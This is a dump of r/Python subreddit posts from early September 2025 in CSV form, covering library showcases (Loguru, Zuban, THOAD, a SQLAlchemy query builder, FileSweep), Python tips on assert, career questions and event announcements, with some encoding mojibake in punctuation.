1n8f68b,Has anyone here tried using MCP to give Python LLM agents live web access?,PINKINKPEN100,0,0,2025-09-04 16:37:21,https://www.reddit.com/r/Python/comments/1n8f68b/has_anyone_here_tried_using_mcp_to_give_python/,"I‚Äôve been experimenting with Model Context Protocol (MCP) in my Python workflows, and it honestly feels like giving an agent a pair of eyes. Normally, the moment you ask an LLM for live data, it either hallucinates, gives outdated info, or makes you copy-paste results manually. With MCP, I was able to fetch URLs in real time, handle JS-heavy pages, and pass structured HTML or Markdown back into Python without babysitting scrapers.

I tried it with the [Crawlbase MCP Server](https://github.com/crawlbase/crawlbase-mcp) since it already works with tools like Claude Desktop and Cursor, and so far it‚Äôs been surprisingly smooth. Much less time fighting with proxies and CAPTCHAs, and more time actually building. There‚Äôs also a [guide](https://crawlbase.com/blog/introducing-crawlbase-mcp-feed-real-time-web-data-to-the-llms/) for Crawlbase MCP Server if you want to try setting it up yourself, but I‚Äôm mostly curious to hear how others are using MCP in their Python projects.

Anyone else been playing with this? What kind of workflows or hacks have you tried?"
1n8f0xu,PyCon 2025 Workshop: Agentic Apps with Pydantic-AI,aherontas,20,10,2025-09-04 16:31:51,https://www.reddit.com/r/Python/comments/1n8f0xu/pycon_2025_workshop_agentic_apps_with_pydanticai/,"**Hey all!**

I recently gave a workshop talk at **PyCon Greece 2025** about building production-ready agent systems.  
To check it out, I put together a demo repo (slides coming soon on my blog: [petrostechchronicles.com](https://www.petrostechchronicles.com/?utm_source=chatgpt.com)):

Repo: [github.com/Aherontas/Pycon\_Greece\_2025\_Presentation\_Agents](https://github.com/Aherontas/Pycon_Greece_2025_Presentation_Agents?utm_source=chatgpt.com)

**The idea**: show how multiple AI agents can collaborate using **FastAPI + Pydantic-AI**, with protocols like **MCP (Model Context Protocol)** and **A2A (Agent-to-Agent)** for safe communication and orchestration.

**Features:**

* Multiple agents running in containers
* MCP servers (Brave search, GitHub, filesystem, etc.) as tools
* A2A communication between services
* Minimal UI for experimentation (e.g., repo analysis)

**Why I built this**:  
Most agent frameworks look great in isolated demos, but fall apart when you try to glue agents together into a real application.  
My goal was to help people experiment with these patterns and move closer to real-world use cases.

It‚Äôs not production-grade, but I‚Äôd love **feedback, criticism, or war stories** from anyone who‚Äôs tried building multi-agent systems.

**Big question for discussion:**  
Do you think agent-to-agent protocols like MCP/A2A will stick?  
Or will the future be mostly single powerful LLMs with plugin stacks?"
1n8d6pi,Production-Grade Python Logging Made Easier with Loguru,finallyanonymous,150,22,2025-09-04 15:23:33,https://www.reddit.com/r/Python/comments/1n8d6pi/productiongrade_python_logging_made_easier_with/,"While Python's standard logging module is powerful, navigating its system of handlers, formatters, and filters can often feel like more work than it should be.

[I wrote a guide](https://www.dash0.com/guides/python-logging-with-loguru) on how to achieve the same (and better) results with a fraction of the complexity using Loguru. It‚Äôs approachable, can intercept logs from the standard library, and exposes its other great features in a much cleaner API.

Looking forward to hearing what you think!"
1n8c4ou,"FileSweep, a fast duplicate & clutter file cleaner",zeya07,2,9,2025-09-04 14:44:14,https://www.reddit.com/r/Python/comments/1n8c4ou/filesweep_a_fast_duplicate_clutter_file_cleaner/,"Hey everyone! I built FileSweep, a utility to help keep duplicates and clutter under control. I have the bad habit of downloading files and then *copying* them someplace else, instead of moving and deleting them. My downloads folder is currently 23 gigabytes, with 4 year old files and quadruple copies. Checking 3200 files manually is a monumental task, and I would never start doing it. That is why I build FileSweep. It is designed to allow fine-grained control over what gets deleted, with a focus on file duplicates.

Get the source code at [https://github.com/ramsteak/FileSweep](https://github.com/ramsteak/FileSweep)

# What My Project Does

FileSweep is a set-and-forget utility that:

* is easily configurable for your own system,
* detects duplicates across multiple folders, with per-directory priorities and policies,
* moves files to recycle bin / trash with send2trash,
* is very fast (with cache enabled, scans the above-described download directory in 1.2 seconds) with only the necessary disk reads,
* is cross-platform,
* can select files based on name, extension, regex, size and age,
* supports different policies (from keep to always delete),
* has dry-run mode for safe testing, guaranteeing that no file is deleted,
* can be set up as a cron / task scheduler task, and work in the background.

# How it works

* You set up a filesweep.yaml config describing which folders to scan, their priorities, and what to do with duplicates or matches (an example config with the explanation for every field is available in the repo)
* FileSweep builds a cache of file metadata and hashes, so future runs are much faster
* Respect rules for filetype, size, age, ...

# Target Audience

Any serial downloader of files that wants to keep their hard drive in check

# Comparison

dupeGuru is another duplicate-manager software. It uses Qt5 as GUI, so it can be more intuitive to beginners, and the user manually parses through duplicates. FileSweep is an automated CLI tool, can be configured and run without the need of a display and with minimal user intervention.

FileSweep is freely available (MIT License) from the [github repo](https://github.com/ramsteak/FileSweep)

Tested with Python 3.12+"
1n8b41e,I built a Python library to simplify complex SQLAlchemy queries with a clean architecture.,LordPeter_s,5,0,2025-09-04 14:06:15,https://www.reddit.com/r/Python/comments/1n8b41e/i_built_a_python_library_to_simplify_complex/,"Hey¬†r/Python,

Like many of you, I've spent countless hours writing boilerplate code for web APIs that use SQLAlchemy. Handling dynamic query parameters for filtering on nested relationships, sorting, full-text search, and pagination always felt repetitive and prone to errors.

To solve this, I created¬†**fastapi-query-builder**.

Don't let the name fool you! While it was born from a FastAPI project, it's fundamentally a powerful, structured way to handle SQLAlchemy queries that can be adapted to any Python framework (Flask, Django Ninja, etc.).

The most unique part is its installation, inspired by¬†shadcn/ui. Instead of being just another black-box package, you run¬†query-builder init, and it copies the entire source code into your project. This gives you¬†**full ownership**¬†to customize, extend, or fix anything you need.

**GitHub Repo:**¬†[**https://github.com/Pedroffda/fastapi-query-builder**](https://www.google.com/url?sa=E&q=https%3A%2F%2Fgithub.com%2FPedroffda%2Ffastapi-query-builder)

# How it Works: A Clean Architecture

The library encourages a clean, three-layer architecture to separate concerns:

1. **BaseService**: The data access layer. It talks to the database using SQLAlchemy and the core¬†QueryBuilder. It only deals with SQLAlchemy models.
2. **BaseMapper**: The presentation layer. It's responsible for transforming SQLAlchemy models into Pydantic schemas, intelligently handling relationship loading and field selection (select\_fields).
3. **BaseUseCase**: The business logic layer. It coordinates the service and the mapper. Your API endpoint talks to this layer, keeping your routes incredibly clean.

# A Quick, Realistic Example

Here‚Äôs a one-time setup for a¬†Post¬†model that has a relationship with a¬†User¬†model.

    # --- In your project, after running 'query-builder init' ---
    
    # Import from your local, customizable copy
    from query_builder import BaseService, BaseMapper, BaseUseCase, get_dynamic_relations_map
    from your_models import User, Post
    from your_schemas import UserView, PostView
    
    # 1. Define Mappers (SQLAlchemy Model -> Pydantic Schema)
    user_mapper = BaseMapper(model_class=User, view_class=UserView, ...)
    post_mapper = BaseMapper(
        model_class=Post,
        view_class=PostView,
        relationship_map={
            'user': {'mapper': user_mapper.map_to_view, ...}
        }
    )
    
    # 2. Define the Service (Handles all the DB logic)
    post_service = BaseService(
        model_class=Post,
        relationship_map=get_dynamic_relations_map(Post),
        searchable_fields=[""title"", ""content"", ""user.name""] # <-- Search across relationships!
    )
    
    # 3. Define the UseCase (Connects Service & Mapper)
    post_use_case = BaseUseCase(
        service=post_service,
        map_to_view=post_mapper.map_to_view,
        map_list_to_view=post_mapper.map_list_to_view
    )

After this setup, your API endpoint becomes trivial. Here's a FastAPI example, but you can adapt the principle to any framework:

    from query_builder import QueryBuilder
    
    query_builder = QueryBuilder()
    
    u/router.get(""/posts"")
    async def get_posts(query_params: QueryParams = Depends(), ...):
        filter_params = query_builder.parse_filters(query_params)
        
        # The UseCase handles everything!
        return await post_use_case.get_all(
            db=db,
            filter_params=filter_params,
            ... # all other params like search, sort_by, etc.
        )

This setup unlocks powerful, clean, and complex queries directly from your URL, like:

* **Find posts with ""Python"" in the title, by authors named ""Pedro"":** .../posts?filter\[title\]\[ilike\]=%Python%&filter\[user.name\]\[ilike\]=%Pedro%
* **Sort posts by user's name, then by post ID descending:** .../posts?sort\_by=user.name,-id
* **Select specific fields from both the post and the related user:** .../posts?select\_fields=id,title,user.id,user.name

# I'd love your feedback!

This is my first open-source library, and I‚Äôm keen to hear from experienced Python developers.

* What are your thoughts on the three-layer (Service,¬†Mapper,¬†UseCase) architecture?
* Is the¬†shadcn/ui¬†""vendoring"" approach (copying the code into your project) appealing?
* What crucial features do you think are missing?
* Any obvious pitfalls or suggestions for improvement in the code?

It's on TestPyPI now, and I'm hoping to make a full release after getting some community feedback.

**TestPyPI Link:**¬†[https://test.pypi.org/project/fastapi-query-builder/](https://www.google.com/url?sa=E&q=https%3A%2F%2Ftest.pypi.org%2Fproject%2Ffastapi-query-builder%2F)

Thanks for taking the time to look at my project"
1n87g91,Rant: use that second expression in `assert`!,HommeMusical,254,137,2025-09-04 11:23:00,https://www.reddit.com/r/Python/comments/1n87g91/rant_use_that_second_expression_in_assert/,"The `assert` statement is wildly useful for developing and maintaining software. I sprinkle `assert`s liberally in my code at the beginning to make sure what I think is true, is actually true, and this practice catches a vast number of idiotic errors; and I keep at least some of them in production.

But often I am in a position where someone else's assert triggers, and I see in a log something like `assert foo.bar().baz() != 0` has triggered, and I have no information at all.

Use that second expression in `assert`! 

It can be anything you like, even some calculation, and it doesn't get called unless the assertion fails, so it costs nothing if it never fires. When someone has to find out why your assertion triggered, it will make everyone's life easier if the assertion explains what's going on.

I often use

    assert some_condition(), locals()

which prints every local variable if the assertion fails. (`locals()` might be impossibly huge though, if it contains some massive variable, you don't want to generate some terabyte log, so be a little careful...)

And remember that `assert` is a statement, not an expression. That is why this `assert` will never trigger:

    assert (
       condition,
       ""Long Message""
    )

because it asserts that the expression `(condition, ""Message"")` is truthy, which it always is, because it is a two-element tuple.

Luckily I read an article about this long before I actually did it. I see it every year or two in someone's production code still.

Instead, use 

    assert condition, (
        ""Long Message""
    )"
1n86hnz,I made a script that identifies graded Pokemon cards with OCR,haddock420,28,0,2025-09-04 10:29:31,https://www.reddit.com/r/Python/comments/1n86hnz/i_made_a_script_that_identifies_graded_pokemon/,"Hi everyone,

I run a [Pokemon deal finder](https://www.jimmysdealfinder.com) site that finds deals on Pokemon cards on eBay by comparing listing prices to historical card values.

I used to have graded cards on there, but I had to remove them from the site because too many people would lie in the title about what grade it is. For example, they might put ""PSA 10"" when it's only a PSA 9 or they might put ""Easily a PSA 10"" or ""Potential PSA 10"" when the card was ungraded. There were enough cards like this that I had to remove graded cards from the site because there were too many misleading graded listings.

I decided to try to use OCR on the card images to identify the grade rather than trusting what the user says in the title. I managed to write a surprisingly accurate script for identifying the grade of PSA 9 and PSA 10 cards.

It uses the cv2 and easyocr libraries, and it searches for sections that look purely black and white in the image (likely to be text), then it scans that section for the words ""MINT"" (grade 9) or ""GEM MT"" (grade 10) to determine the grade of the card.

It works surprisingly well, and the best thing is there are no false positives.

Now I've got graded cards back on my site, and they all seem to be identified correctly.

**What My Project Does**

Takes an image of a Pokemon card, and determiners whether it's a grade 9 or 10 or ungraded.

**Target Audience**

This is mainly for myself as a tool to add graded cards back to my site. Though it could be useful for anyone who needs to identify a graded card from an image.

**Comparison**

When I was first writing this, I did search on Google to see if anyone had done OCR recognition on graded Pokemon cards, but I didn't really find anything. I think this is unique in that regard.

You can run it with get_grade_ocr() on either a filename or a URL.

Github: https://github.com/sgriffin53/pokemon_ocr"
1n85395,flattening elements from a  nested list,Top_Decision_6132,0,12,2025-09-04 09:04:14,https://www.reddit.com/r/Python/comments/1n85395/flattening_elements_from_a_nested_list/,"    I am trying to write a program using list comprehension to flat the list like [[1,2,3],[4,5],6,7,[8,9],10] - a nested list having subslists and integer type elements. "
1n85285,Typewriter sound program,Consistent-Hat-6032,5,7,2025-09-04 09:02:18,https://www.reddit.com/r/Python/comments/1n85285/typewriter_sound_program/,I love the sound of a typewriter. I like the mechanical sound but I don't like typing on mechanical keyboards. How would one go about writing a program that imitates the typewriter sound as I'm typing?
1n84tr5,Newsletters/people to follow and read,empi91,1,3,2025-09-04 08:46:45,https://www.reddit.com/r/Python/comments/1n84tr5/newsletterspeople_to_follow_and_read/,"Looking for recommendations who to follow on LinkedIn to get some quality Python content? Because my current Ln bubble focus mostly on AI, which started to be bit boring, I'm looking for some actual Python devs/architects/etc posting quality stuff (around mid level preferably).   
Also, if there are any newsletters (free) worth signing I'd love a recommendation as well. "
1n84top,Showcase: ecma426: Source Maps in Pure Python,klaasvanschelven,6,0,2025-09-04 08:46:38,https://www.reddit.com/r/Python/comments/1n84top/showcase_ecma426_source_maps_in_pure_python/,"### What My Project Does

**ecma426** is a pure-Python implementation of [ECMA-426: Source Maps](https://tc39.es/source-map/). It decodes and encodes sourcemaps, including index maps with `sections`, and aims to stay close to the specification.

### Target Audience

Anyone working with JavaScript toolchains from Python. For example, build systems, bundlers, error trackers, or debugging tools that need to parse or emit sourcemaps. It‚Äôs intended for production use, not just experimentation.

### Comparison

Most Python sourcemap libraries are either unmaintained or only handle decoding. **ecma426** covers both directions (decode and encode) and supports `sections` as defined in the spec, while staying dependency-free.

### Usage

```python
import ecma426, json

smap = ecma426.loads(json.load(open(""app.min.js.map"")))

# strict lookup (exact match only, raises KeyError if absent)
m = smap[(10, 42)]

# nearest-left lookup (devtools convention)
m = smap.lookup_left(10, 42)

# map back into the original text
line = smap.raw[""sourcesContent""][0].splitlines()[m.original_line]
print(line)
print("" "" * m.original_column + ""^ here"")
```

### Source

[https://github.com/bugsink/ecma426](https://github.com/bugsink/ecma426)"
1n84q1m,# How to train a AI in windows (easy),Significant_Fill_452,0,0,2025-09-04 08:40:07,https://www.reddit.com/r/Python/comments/1n84q1m/how_to_train_a_ai_in_windows_easy/,"To train a AI in windows use a python library called automated-neural-adapter-ANA
This library allows the user to lora train there AI using a Gui below are the steps to finetune your AI:
## Installation
*1: Installation*
install the library using
python
pip install automated-neural-adapter-ANA
**2: Usage **
run python python -m ana  in your command prompt (it might take a while)
*3: What it dose*
The base model id is the hugging face id of the model you want to training in this case we are training tinyllama1.1b you can chose any model by going to https://huggingface.co/models eg if you want to train TheBloke/Llama-2-7B-fp16 replace TinyLlama/TinyLlama-1.1B-Chat-v1.0 with TheBloke/Llama-2-7B-fp16
*4: Output*
output directory is the path where your model is stored
*5: Disk offload*
offloads the model to a path if it cant fit inside your vram and ram (this will slow down the process significantly)
*6: Local dataset*
is the path in the local dataset path you can select the data in which you want to train your model also if you click on hugging face hub you can use a hugging face dataset
*7: Training Parameters*
In this section you can adjust how your AI will be trained:
‚Ä¢	Epochs ‚Üí how many times the model goes through your dataset.
‚Ä¢	Batch size ‚Üí how many samples are trained at once (higher = faster but needs more VRAM).
‚Ä¢	Learning rate ‚Üí how fast the model adapts (default is usually fine for beginners).
Tip: If you‚Äôre just testing, set epochs = 1 and a small dataset to save time.
*8: Start Training*
Once everything is set, click Start Training.
‚Ä¢	A log window will open showing progress (loss going down = your model is learning).
‚Ä¢	Depending on your GPU/CPU and dataset size, this can take minutes to days. (If you don‚Äôt have a gpu it will take a lottt of time, and if you have one but it dosent detect it install cuda and pytorch for that specific cuda version)
Congratulation you have successfully lora finetuned your AI
to talk to your AI you must convert it to a gguf format there are many tutorials online for that"
1n84hjt,PyconFR at Lyon (France),MelcoreHat,22,0,2025-09-04 08:24:02,https://www.reddit.com/r/Python/comments/1n84hjt/pyconfr_at_lyon_france/,"The French-Speaking Python Association (AFPy) is organizing PyConFR 2025 from Thursday, October 30 to Sunday, November 2. For this 16th edition, we‚Äôll be hosted by the Ren√© Cassin Campus in Lyon!

PyConFR is a free, four-day event centered around the Python programming language. It includes two days of collaborative development (sprints), followed by two days of talks and workshops.

The call for proposals is now closed, and we‚Äôll be publishing the schedule soon at https://www.pycon.fr/2025/en/schedule.html. There will be an English-language track.

While attendance is free, registration is required for all participants.

As every year, we offer support to people who are usually underrepresented at conferences ‚Äî help with finding a topic, writing a proposal, preparing slides, and rehearsing. Feel free to contact us at [diversite@afpy.org]()"
1n802wo,I made a chat program,Redstonedust653,3,20,2025-09-04 03:55:58,https://www.reddit.com/r/Python/comments/1n802wo/i_made_a_chat_program/,"# What my project does

It's a simple socket-based python messaging ""app"" that works on linux. I don't know if it works on windows, so comment if it does

# Target audience

I dunno, if you want a template for a chat program you can expand on this? I just made it to mess with socket

# Comparison

I mean, there are a lot of online tutorials for stuff like this, but i dunno, this one has a *bit* more than *most* of the tutorials.

Anyways, [here's a link](https://github.com/Redstonedust653/pychat) to the github repository.

enjoy!

  
NOTE:

Don't read the comments! look at the repository. if you have issues with some part of it, LEAVE AN ISSUE ON THE REPOSITORY! ALL COMMENTS WILL BECOME OUTDATED EVERY TIME I PATCH IT.

SEVERAL OF THE ISSUES IN COMMENTS HAVE BEEN FIXED.

BUT PLEASE DON'T COMMENT ISSUES."
1n800hy,Airfoil Optimizer.,Turbulent-Start-4840,2,1,2025-09-04 03:52:16,https://www.reddit.com/r/Python/comments/1n800hy/airfoil_optimizer/,"Hey yall!  
So recently, for a personal plane project of mine, I developed FoilNet,¬†[https://github.com/AvnehSBhatia/FoilNet](https://github.com/AvnehSBhatia/FoilNet)

It's an airfoil optimizer, as the title suggests. However, I am not too certain about these results that I'm getting from the optimizer.

If anyone knows a good bit about Airfoils and think they can validate my results, please feel free to do so!

Any comments or criticism is appreciated.

Thanks!"
1n7v62y,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,5,1,2025-09-04 00:00:34,https://www.reddit.com/r/Python/comments/1n7v62y/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1n7sr1x,"Why does ProcessPoolExecutor mark some tasks as ""running"" even though all workers are busy?",Ordinary_Run_2513,13,9,2025-09-03 22:16:26,https://www.reddit.com/r/Python/comments/1n7sr1x/why_does_processpoolexecutor_mark_some_tasks_as/,"I‚Äôm using Python‚Äôs `ProcessPoolExecutor` to run a bunch of tasks. Something I noticed is that some tasks are marked as *running* even though all the workers are already working on other tasks.

From my understanding, a task should only switch from *pending* to *running* once a worker actually starts executing it. But in my case, it seems like the executor marks extra tasks as running before they‚Äôre really picked up.

Is this normal behavior of `ProcessPoolExecutor`? Or am I missing something about how it manages its internal task queue?"
1n7r4xb,"Niche Python tools, libraries and features - whats your favourite?",OllieOps,132,157,2025-09-03 21:11:38,https://www.reddit.com/r/Python/comments/1n7r4xb/niche_python_tools_libraries_and_features_whats/,"I know we see this get asked every other week, but it always makes for a good discussion.

I only just found out about `pathlib` \- makes working with files so much cleaner.

Whats a python tool or library you wish youd known about earlier?"
1n7qxeb,About the spheres of the Python and career paths,SchizmOne,2,16,2025-09-03 21:03:21,https://www.reddit.com/r/Python/comments/1n7qxeb/about_the_spheres_of_the_python_and_career_paths/,"Hey, guys. I wanted to ask Python Developers here in case any of you had similar doubts about their career paths.  
  
So, I'm a Python Test Automation Engineer with about 6 years of experience, and I‚Äôve recently started to seriously think about **how I can grow** as a specialist in the industry and **what I actually want to do**. After a bit of introspection, I picked the possible paths:

1. **SDET** ‚Äì keep digging deeper into QA Automation. There‚Äôs still a lot to learn, like load testing, etc.
2. **DevOps** ‚Äì build on what I‚Äôve already done as part of QA Automation, such as preparing CI/CD pipelines, scripting, support, etc.
3. **Developer** ‚Äì move straight into the pure development sphere.

Right now, I‚Äôm really leaning toward option 3, because (and I think many of you will understand this feeling) I genuinely enjoy solving problems, creating solutions, building something piece by piece, and then seeing how it works, how cool it looks, and. Something you can actually use. Those little ‚Äúahhh, that‚Äôs how it works‚Äù moments, you know.

But there‚Äôs one thing that‚Äôs a bit upsetting to me: the modern spheres of Python. Specifically, how much of it is tied to AI Development, Data Science, Machine Learning, etc. It feels like half of the Python market is focused on these things.

Of course I don‚Äôt hate AI, it‚Äôs just a technology after all. As specialists, we still need to use it in our work. So maybe this is just my prejudice, and it‚Äôs time for me to accept that this is simply how things are. Still, if I had the choice, I‚Äôd prefer not to work in that space. But if I will ignore it, I feel like I‚Äôd be cutting myself off from about half of the possible opportunities as a Python Developer.

What do you think about the current market and your options as Python Developers? Maybe I‚Äôm missing something obvious, or maybe my understanding of the market isn‚Äôt close to reality."
1n7qs6r,Python for impatient people - Basics in 10 minutes,Priler96,3,0,2025-09-03 20:57:56,https://www.reddit.com/r/Python/comments/1n7qs6r/python_for_impatient_people_basics_in_10_minutes/,"Hey everyone,

I just uploaded a short and beginner-friendly **Python tutorial** on YouTube where I explain the core concepts in only 10 minutes. Perfect if you're just starting out or need a quick refresher.

üëâ [Watch it here on YouTube](https://www.youtube.com/watch?v=uBhe1Rvp4PI)

I kept it simple, practical, and straight to the point - no fluff, just code and examples.  
Would love your feedback on whether you'd like to see more quick lessons like this!

Thanks!"
1n7pe37,"Removing a dependency - Major, Minor or Patch bump?",jcfitzpatrick12,31,23,2025-09-03 20:05:24,https://www.reddit.com/r/Python/comments/1n7pe37/removing_a_dependency_major_minor_or_patch_bump/,"I've been collaborating on an [issue](https://github.com/jcfitzpatrick12/spectre/issues/167) for [*Spectre*](https://github.com/jcfitzpatrick12/spectre), a Python program for recording radio spectrograms with software-defined radios. The motivation for the issue was to remove [Scipy](https://scipy.org/) as dependency from a Python package used by the program called [spectre-core](https://github.com/jcfitzpatrick12/spectre-core).

The [PR](https://github.com/jcfitzpatrick12/spectre-core/pull/52) introduced no changes from the perspective of the public API of the package. It just reimplemented the same functionality for our particular use case. However, we removed Scipy as a dependency since it was no longer required. Under [semantic versioning](https://semver.org/), would this constitute a major, minor or patch bump?

I considered making this a major bump, since any consumer of the package relying on Scipy being a transitive dependency would see a breaking change. But since the Scipy functionality wasn't exposed publically, I didn't think this argument was strong enough and so opted for a minor bump. What would you do?"
1n7neyq,Streamledge - Launch YouTube and Twitch Videos in a Minimal Browser Window,Blasman13,5,0,2025-09-03 18:51:08,https://www.reddit.com/r/Python/comments/1n7neyq/streamledge_launch_youtube_and_twitch_videos_in_a/,"Source: [https://github.com/Blasman/Streamledge](https://github.com/Blasman/Streamledge)

Streamledge is a command-line tool for playing YouTube and [Twitch.tv](http://Twitch.tv) videos.

**What My Project Does**

Streamledge works by loading a lightweight (\~30MB RAM) local flask web server in the background when first ran. This allows Streamledge to be ran with command line arguments that utilize the server to embed and play videos in a **minimal** Chromium-based web browser `--app` window.

**Target Audience**

Streamledge may be of use to anyone who watches YouTube and/or Twitch and/or works from the command prompt / terminal. It can also be useful if you are a minimalist or have multiple monitors and want the freedom to move videos around. It can be combined with the web browser extension to be used on the YouTube and Twitch websites to launch links in the Streamledge embedded player.

**Comparison**

Streamledge is not yet another YouTube downloader. It's different because the videos play immediately in a locally embedded player."
1n7ibkk,DINOv3-CLIP Adapter,papersashimi,7,4,2025-09-03 15:44:11,https://www.reddit.com/r/Python/comments/1n7ibkk/dinov3clip_adapter/,"Created a tiny adapter that connects DINOv3's image encoder to CLIP's text space.

Essentially, DINOv3 has better vision than CLIP, but no text capabilities. This lets you use dinov3 for images and CLIP for text prompts. This is still v1 so the next stages will be mentioned down below. 

**Target Audience:**

ML engineers who want zero-shot image search without training massive models

Works for zero shot image search/labeling. Way smaller than full CLIP. Performance is definitely lower because it wasnt trained on image-text pairs.

**Next steps**: May do image-text pair training. Definitely adding a segmentation or OD head. Better calibration and prompt templates

Code and more info can be found here: [https://github.com/duriantaco/dinov3clip](https://github.com/duriantaco/dinov3clip)

If you'll like to colab or whatever do ping me here or drop me an email. "
1n7e1oa,Zuban is now Open Source,zubanls,220,41,2025-09-03 12:55:41,https://www.reddit.com/r/Python/comments/1n7e1oa/zuban_is_now_open_source/,"Zuban, the successor of Jedi is now Open Source: [https://github.com/zubanls/zuban](https://github.com/zubanls/zuban)

Zuban is a high-performance Python Language Server and type checker implemented in Rust, by the author of Jedi. Zuban is 20‚Äì200√ó faster than Mypy, while using roughly half the memory and CPU compared to Ty and Pyrefly. It offers both a PyRight-like mode and a Mypy-compatible mode, which behaves just like Mypy; supporting the same config files, command-line flags, and error messages.

Most important LSP features are supported. Features include diagnostics, completions, goto, references, rename, hover and document highlights.

Zuban passes over 95% of Mypy‚Äôs relevant test suite and offers comprehensive support for Python's [type system](https://htmlpreview.github.io/?https://github.com/python/typing/blob/main/conformance/results/results.html)."
1n7cwjq,PySurf is now Quantum!,Apart-Television4396,0,3,2025-09-03 12:02:53,https://www.reddit.com/r/Python/comments/1n7cwjq/pysurf_is_now_quantum/,"Hello, everyone! I made a decision to abandon the PySurf project, and start a new web browser from scratch, called Quantum. Quantum is made in Electron JS, which allows more customisation of both the UI, and the functionality itself. Unfortunately, I'll not be able to post updates on this subreddit, because Electron JS is not Python, but you'll be able to find Quantum on r/browsers, r/SideProject, and more. Quantum is still in early stages of development, so please contribute on GitHub, if you can.

Check out Quantum here: [https://github.com/VG-dev1/Quantum](https://github.com/VG-dev1/Quantum)

Or, check out the legacy PySurf here: [https://github.com/VG-dev1/PySurf](https://github.com/VG-dev1/PySurf)

"
1n77jvv,I built a Python library for working with LLMs ‚Äî would love your feedback,Thick-Mushroom6151,0,3,2025-09-03 06:37:20,https://www.reddit.com/r/Python/comments/1n77jvv/i_built_a_python_library_for_working_with_llms/,"
# akgpt

I built a Python library for working with LLMs ‚Äî looking for feedback üôå  

## üì¶ Installation
```bash
pip install akgpt

üöÄ Example usage

from akgpt.main import AKGPT

client = AKGPT()

prompt = ""–ß—Ç–æ —Ç–∞–∫–æ–µ –∏—Å–∫—É—Å—Å—Ç–≤–µ–Ω–Ω—ã–π –∏–Ω—Ç–µ–ª–ª–µ–∫—Ç?""
result = client.query(prompt)

if result:
    print(""–û—Ç–≤–µ—Ç API:"", result)


‚ú® Features

Simple client interface (AKGPT.query)

Configurable generation parameters (temperature, top_p, penalties, etc.)

Supports both text and JSON outputs

Works with multiple providers (OpenAI, Mistral, Pollinations)

Python 3.8+


üí° Feedback wanted

I‚Äôd really appreciate your feedback:

How do you feel about the API design?

Which features would be most useful for you (async client, FastAPI integration, more model providers)?


üëâ Project on PyPI: akgpt

Thanks for checking it out üôè


"
1n717ga,Working with MCP and tired of boilerplate? You might like what we‚Äôre launching,data_diva_0902,0,1,2025-09-03 01:04:10,https://www.reddit.com/r/Python/comments/1n717ga/working_with_mcp_and_tired_of_boilerplate_you/," Saw the MCP Toolkit thread here ‚Äî super cool stuff. We‚Äôve been running into the same friction: too much boilerplate, unclear abstractions, and devs spending more time wiring than building.

We‚Äôve been working on a solution that streamlines agentic workflows ‚Äî combining trusted control, orchestration, and reasoning through MCP without the usual overhead.

We're doing a live walkthrough of what we‚Äôre launching ‚Äî how teams are using it to build faster, integrate smoother, and avoid rebuilding the wheel every time they want an agent to do something non-trivial.

If you‚Äôre working with MCP or just want to see how the tooling is evolving, check it out: [https://www.thoughtspot.com/spotlight-series-boundaryless?utm\_source=livestream&utm\_medium=webinar&utm\_term=post1&utm\_content=reddit&utm\_campaign=wb\_productspotlight\_boundaryless25](https://www.thoughtspot.com/spotlight-series-boundaryless?utm_source=livestream&utm_medium=webinar&utm_term=post1&utm_content=reddit&utm_campaign=wb_productspotlight_boundaryless25)"
1n6xw8z,"Meet THOAD, High Order Derivatives for PyTorch Graphs",WildAppearance2153,28,0,2025-09-02 22:37:59,https://www.reddit.com/r/Python/comments/1n6xw8z/meet_thoad_high_order_derivatives_for_pytorch/,"I‚Äôm excited to share **thoad** (short for Py**T**orch **H**igh **O**rder **A**utomatic **D**ifferentiation), a Python only library that computes arbitrary order partial derivatives directly on a PyTorch computational graph. The package has been developed within a research project at Universidad Pontificia de Comillas (ICAI), and we are considering publishing an academic article in the future that reviews the mathematical details and the implementation design.

At its core, thoad takes a one output to many inputs view of the graph and pushes high order derivatives back to the leaf tensors. Although a 1‚ÜíN problem can be rewritten as 1‚Üí1 by concatenating flattened inputs, as in functional approaches such as `jax.jet` or `functorch`, thoad‚Äôs graph aware formulation enables an optimization based on **unifying independent dimensions** (especially batch). This delivers **asymptotically better scaling** with respect to batch size. Additionally, we compute derivatives **vectorially** rather than component by component, which is what makes a pure PyTorch implementation practical without resorting to custom C++ or CUDA.

The package is **easy to maintain**, because it is written entirely in Python and uses **PyTorch** as its only dependency. The implementation stays at a high level and leans on PyTorch‚Äôs vectorized operations, which means no custom C++ or CUDA bindings, no build systems to manage, and fewer platform specific issues.

The package can be installed from **GitHub** or **PyPI**:

* GitHub: [https://github.com/mntsx/thoad](https://github.com/mntsx/thoad)
* PyPI: [https://pypi.org/project/thoad/](https://pypi.org/project/thoad/)

In our benchmarks, **thoad outperforms** `torch.autograd` **for Hessian calculations even on CPU**. See the notebook that reproduces the comparison: https://github.com/mntsx/thoad/blob/master/examples/benchmarks/benchmark\_vs\_torch\_autograd.ipynb.

The user experience has been one of our main concerns during development. **thoad** is designed to align closely with PyTorch‚Äôs interface philosophy, so running the high order backward pass is practically indistinguishable from calling PyTorch‚Äôs own `backward`. When you need finer control, you can keep or reduce Schwarz symmetries, group variables to restrict mixed partials, and fetch the exact mixed derivative you need. Shapes and independence metadata are also exposed to keep interpretation straightforward.

# USING THE PACKAGE

**thoad** exposes two primary interfaces for computing high-order derivatives:

1. `thoad.backward`: a function-based interface that closely resembles `torch.Tensor.backward`. It provides a quick way to compute high-order gradients without needing to manage an explicit controller object, but it offers only the core functionality (derivative computation and storage).
